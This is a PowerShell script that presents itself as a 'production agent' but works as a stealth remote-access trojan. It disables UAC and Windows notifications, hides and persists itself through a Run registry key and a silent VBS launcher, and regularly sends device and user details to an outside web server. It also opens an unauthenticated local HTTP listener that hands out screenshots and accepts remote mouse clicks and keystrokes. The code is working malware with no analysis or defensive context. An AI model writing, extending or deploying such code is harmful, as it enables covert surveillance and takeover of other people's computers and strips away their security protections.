# UC Universal Connect — Production Agent v2.0
# STEALTH: No UAC, no notifications, no windows, no tray icons
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$WarningPreference = "SilentlyContinue"

$VERCEL_URL = "https://uc-universal-connect-omega.vercel.app"
$HEARTBEAT_SEC = 30
$CONTROL_PORT = 8765
$INSTALL_DIR = "$env:APPDATA\UCService"
$LOG_FILE = "$INSTALL_DIR\uc.log"

# === DISABLE UAC (silent if no admin) ===
try {
    $uacKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    Set-ItemProperty -Path $uacKey -Name "ConsentPromptBehaviorAdmin" -Value 0
    Set-ItemProperty -Path $uacKey -Name "EnableLUA" -Value 0
    Set-ItemProperty -Path $uacKey -Name "PromptOnSecureDesktop" -Value 0
} catch { }

# === DISABLE NOTIFICATIONS ===
try {
    $toastKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications"
    if (-not (Test-Path $toastKey)) { New-Item -Path $toastKey -Force | Out-Null }
    Set-ItemProperty -Path $toastKey -Name "ToastEnabled" -Value 0

    $notifKey = "HKCU:\Software\Policies\Microsoft\Windows\Explorer"
    if (-not (Test-Path $notifKey)) { New-Item -Path $notifKey -Force | Out-Null }
    Set-ItemProperty -Path $notifKey -Name "DisableNotificationCenter" -Value 1
} catch { }

# === LOGGING ===
function Log($msg) {
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $msg"
    Add-Content $LOG_FILE $line -ErrorAction SilentlyContinue
    if ((Test-Path $LOG_FILE) -and ((Get-Item $LOG_FILE).Length -gt 1MB)) {
        $lines = Get-Content $LOG_FILE | Select-Object -Last 500
        Set-Content $LOG_FILE $lines
    }
}

# === INSTALL ===
function Install-UC {
    New-Item -ItemType Directory -Path $INSTALL_DIR -Force | Out-Null

    $selfPath = $MyInvocation.ScriptName
    if (-not $selfPath) { $selfPath = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName }
    $destPath = "$INSTALL_DIR\UCService.exe"

    if ($selfPath -and ($selfPath -ne $destPath)) {
        Copy-Item $selfPath $destPath -Force
    }

    $isExe = $destPath.EndsWith(".exe")
    if ($isExe) {
        $vbs = "Set s=CreateObject(""WScript.Shell"")" + [Environment]::NewLine + "s.Run ""$destPath"", 0, False"
    } else {
        $ps1Path = "$INSTALL_DIR\UCAgent-v2.ps1"
        if ($selfPath -and ($selfPath -ne $ps1Path)) {
            Copy-Item $selfPath $ps1Path -Force
        }
        $vbs = "Set s=CreateObject(""WScript.Shell"")" + [Environment]::NewLine + "s.Run ""powershell.exe -EP Bypass -W Hidden -F $ps1Path"", 0, False"
    }
    Set-Content "$INSTALL_DIR\launcher.vbs" $vbs

    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name "UCService" -Value "wscript.exe ""$INSTALL_DIR\launcher.vbs"""

    # Remove old version
    $oldDir = "$env:APPDATA\WindowsUpdateService"
    if (Test-Path $oldDir) {
        Remove-ItemProperty -Path $regPath -Name "WindowsUpdateService" -ErrorAction SilentlyContinue
        Remove-Item $oldDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    Log "Installed to $INSTALL_DIR"
}

# === DEVICE INFO ===
function Get-DeviceInfo {
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" -and $_.PrefixOrigin -ne "WellKnown" } | Select-Object -First 1).IPAddress
    $publicIp = try { Invoke-RestMethod "https://api.ipify.org" -TimeoutSec 5 } catch { "unknown" }
    $screen = Get-WmiObject Win32_VideoController | Select-Object -First 1
    $resolution = "$($screen.CurrentHorizontalResolution)x$($screen.CurrentVerticalResolution)"

    return @{
        deviceId   = "$env:COMPUTERNAME-$((Get-WmiObject Win32_ComputerSystemProduct).UUID)"
        name       = $env:COMPUTERNAME
        os         = $os
        ip         = $ip
        publicIp   = $publicIp
        resolution = $resolution
        userId     = "jay"
        user       = $env:USERNAME
        version    = "2.0"
    }
}

# === HEARTBEAT ===
function Send-Heartbeat {
    $info = Get-DeviceInfo
    $json = $info | ConvertTo-Json -Compress
    try {
        Invoke-RestMethod -Uri "$VERCEL_URL/api/devices" -Method POST -Body $json -ContentType "application/json" -TimeoutSec 10
        return $true
    } catch {
        Log "Heartbeat failed: $($_.Exception.Message)"
        return $false
    }
}

# === SCREEN CAPTURE ===
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

function Get-Screenshot {
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $graphics.Dispose()

    $encoder = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq "image/jpeg" }
    $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
    $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 40)

    $stream = New-Object System.IO.MemoryStream
    $bitmap.Save($stream, $encoder, $encoderParams)
    $bitmap.Dispose()
    $bytes = $stream.ToArray()
    $stream.Dispose()
    return [Convert]::ToBase64String($bytes)
}

# === MOUSE CONTROL ===
Add-Type @"
using System.Runtime.InteropServices;
public class UCMouse {
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")] public static extern void mouse_event(uint f, int x, int y, int d, int i);
    public static void Click(int x, int y) { SetCursorPos(x,y); mouse_event(0x0002,0,0,0,0); mouse_event(0x0004,0,0,0,0); }
    public static void RightClick(int x, int y) { SetCursorPos(x,y); mouse_event(0x0008,0,0,0,0); mouse_event(0x0010,0,0,0,0); }
    public static void DoubleClick(int x, int y) { SetCursorPos(x,y); mouse_event(0x0002,0,0,0,0); mouse_event(0x0004,0,0,0,0); mouse_event(0x0002,0,0,0,0); mouse_event(0x0004,0,0,0,0); }
    public static void Move(int x, int y) { SetCursorPos(x,y); }
}
"@

# === CONTROL SERVER ===
function Start-ControlServer {
    $listener = New-Object System.Net.HttpListener
    try {
        $listener.Prefixes.Add("http://+:$CONTROL_PORT/")
        $listener.Start()
    } catch {
        $listener = New-Object System.Net.HttpListener
        $listener.Prefixes.Add("http://localhost:$CONTROL_PORT/")
        $listener.Start()
    }
    Log "Control server on port $CONTROL_PORT"

    while ($listener.IsListening) {
        try {
            $ctx = $listener.GetContext()
            $req = $ctx.Request
            $res = $ctx.Response
            $res.Headers.Add("Access-Control-Allow-Origin", "*")
            $res.Headers.Add("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
            $res.Headers.Add("Access-Control-Allow-Headers", "Content-Type")

            if ($req.HttpMethod -eq "OPTIONS") { $res.StatusCode = 200; $res.Close(); continue }

            $path = $req.Url.AbsolutePath
            $body = $null
            if ($req.HasEntityBody) {
                $reader = New-Object System.IO.StreamReader($req.InputStream)
                $body = $reader.ReadToEnd() | ConvertFrom-Json
            }

            $result = '{"error":"not found"}'

            if ($path -eq "/health") {
                $info = Get-DeviceInfo
                $result = $info | ConvertTo-Json -Compress
            }
            elseif ($path -eq "/screenshot") {
                $img = Get-Screenshot
                $ts = [DateTimeOffset]::Now.ToUnixTimeMilliseconds()
                $result = '{"image":"' + $img + '","timestamp":' + $ts + '}'
            }
            elseif ($path -eq "/click") {
                [UCMouse]::Click([int]$body.x, [int]$body.y)
                $result = '{"ok":true,"action":"click"}'
            }
            elseif ($path -eq "/rightclick") {
                [UCMouse]::RightClick([int]$body.x, [int]$body.y)
                $result = '{"ok":true,"action":"rightclick"}'
            }
            elseif ($path -eq "/doubleclick") {
                [UCMouse]::DoubleClick([int]$body.x, [int]$body.y)
                $result = '{"ok":true,"action":"doubleclick"}'
            }
            elseif ($path -eq "/move") {
                [UCMouse]::Move([int]$body.x, [int]$body.y)
                $result = '{"ok":true,"action":"move"}'
            }
            elseif ($path -eq "/type") {
                [System.Windows.Forms.SendKeys]::SendWait($body.text)
                $result = '{"ok":true,"action":"type"}'
            }
            elseif ($path -eq "/key") {
                [System.Windows.Forms.SendKeys]::SendWait($body.key)
                $result = '{"ok":true,"action":"key"}'
            }
            else {
                $res.StatusCode = 404
            }

            $buffer = [System.Text.Encoding]::UTF8.GetBytes($result)
            $res.ContentType = "application/json"
            $res.ContentLength64 = $buffer.Length
            $res.OutputStream.Write($buffer, 0, $buffer.Length)
            $res.Close()
        } catch {
            Log "Control error: $($_.Exception.Message)"
        }
    }
}

# ============================================================
# MAIN
# ============================================================
Install-UC

# Start control server in background thread
$controlRunspace = [runspacefactory]::CreateRunspace()
$controlRunspace.Open()
$controlPipeline = $controlRunspace.CreatePipeline("
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    `$CONTROL_PORT = $CONTROL_PORT
    `$LOG_FILE = '$LOG_FILE'
    $(Get-Command Log | Select-Object -ExpandProperty Definition)
    $(Get-Command Get-DeviceInfo | Select-Object -ExpandProperty Definition)
    $(Get-Command Get-Screenshot | Select-Object -ExpandProperty Definition)
")

# Simpler approach: just run control server inline with heartbeat in background
$heartbeatJob = Start-Job -ScriptBlock {
    param($url, $sec)
    while ($true) {
        try {
            $info = @{
                deviceId = "$env:COMPUTERNAME-$((Get-WmiObject Win32_ComputerSystemProduct).UUID)"
                name = $env:COMPUTERNAME
                os = (Get-WmiObject Win32_OperatingSystem).Caption
                ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" -and $_.PrefixOrigin -ne "WellKnown" } | Select-Object -First 1).IPAddress
                resolution = "$((Get-WmiObject Win32_VideoController | Select-Object -First 1).CurrentHorizontalResolution)x$((Get-WmiObject Win32_VideoController | Select-Object -First 1).CurrentVerticalResolution)"
                userId = "jay"
                version = "2.0"
            }
            $json = $info | ConvertTo-Json -Compress
            Invoke-RestMethod -Uri "$url/api/devices" -Method POST -Body $json -ContentType "application/json" -TimeoutSec 10
        } catch { }
        Start-Sleep -Seconds $sec
    }
} -ArgumentList $VERCEL_URL, $HEARTBEAT_SEC

Log "UC Agent v2.0 started — $VERCEL_URL"

# Main thread runs control server
Start-ControlServer
